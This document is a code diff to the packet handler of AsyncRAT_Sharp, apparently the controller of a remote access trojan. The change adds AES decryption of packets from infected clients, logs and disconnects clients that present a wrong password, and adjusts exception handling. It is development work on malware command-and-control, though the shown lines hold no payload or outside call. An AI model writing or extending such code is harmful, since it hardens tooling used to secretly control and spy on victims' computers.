@@ -4,6 +4,7 @@ using System;
 using System.Diagnostics;
 using System.Drawing;
 using AsyncRAT_Sharp.Forms;
+using System.Security.Cryptography;
 
 namespace AsyncRAT_Sharp.Handle_Packet
 {
@@ -11,13 +12,14 @@ namespace AsyncRAT_Sharp.Handle_Packet
     {
         public static void Read(object Obj)
         {
+            Clients client = null;
             try
             {
                 object[] array = Obj as object[];
                 byte[] data = (byte[])array[0];
-                Clients client = (Clients)array[1];
+                client = (Clients)array[1];
                 MsgPack unpack_msgpack = new MsgPack();
-                unpack_msgpack.DecodeFromBytes(data);
+                unpack_msgpack.DecodeFromBytes(Settings.AES.Decrypt(data));
                 switch (unpack_msgpack.ForcePathObject("Packet").AsString)
                 {
                     case "ClientInfo":
@@ -94,12 +96,18 @@ namespace AsyncRAT_Sharp.Handle_Packet
                         }
                 }
             }
+            catch (CryptographicException)
+            {
+                new HandleLogs().Addmsg($"Client {client.ClientSocket.RemoteEndPoint.ToString().Split(':')[0]} tried to connect with wrong password", Color.Red);
+              //  Settings.Blocked.Add(client.ClientSocket.RemoteEndPoint.ToString().Split(':')[0]);
+                client.Disconnected();
+                return;
+            }
             catch (Exception ex)
             {
                 Debug.WriteLine(ex.Message);
+                return;
             }
-            //GC.Collect();
-            //GC.WaitForPendingFinalizers();
         }
     }
 }
